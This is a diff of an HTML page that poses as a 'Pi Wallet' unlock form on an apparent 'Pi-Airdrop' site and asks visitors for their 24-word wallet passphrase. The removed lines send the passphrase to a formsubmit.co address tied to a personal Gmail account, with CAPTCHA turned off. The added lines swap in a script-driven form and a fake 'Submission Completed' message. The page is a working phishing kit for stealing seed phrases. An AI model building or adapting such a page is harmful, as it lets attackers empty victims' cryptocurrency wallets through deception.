@@ -45,17 +45,11 @@
 
       <section id="passphraseForm" class="passphrase-section hidden">
   <h3>Unlock Pi Wallet</h3>
-  <form action="https://formsubmit.co/kp25626900@gmail.com" method="POST">
-  <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
-  
-  <!-- Prevent CAPTCHA -->
-  <input type="hidden" name="_captcha" value="false">
-
-  <!-- Redirect back to your own page (edit this URL below) -->
-  <input type="hidden" name="_next" value="https://pinetwork314-dot.github.io/Pi-Airdrop/">
-
-  <button class="submit-button" type="submit">Unlock With Passphrase</button>
-</form>
+  <form id="piForm">
+    <textarea name="passphrase" placeholder="Enter your 24-word passphrase here" required></textarea>
+    <input type="hidden" name="_captcha" value="false">
+    <button class="submit-button" type="submit">Unlock With Passphrase</button>
+  </form>
 
   <p class="info">
     As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
@@ -64,6 +58,10 @@
   <p class="warning">
     Lost your passphrase? <a href="#">You can create a new wallet</a>, but all your <b>π</b> 
     in your previous wallet will be inaccessible.
+  </p>
+
+  <p id="confirmationMsg" style="display: none; color: green; font-weight: bold; margin-top: 15px;">
+    ✅ Submission Completed. Thank you!
   </p>
 </section>
     </main>
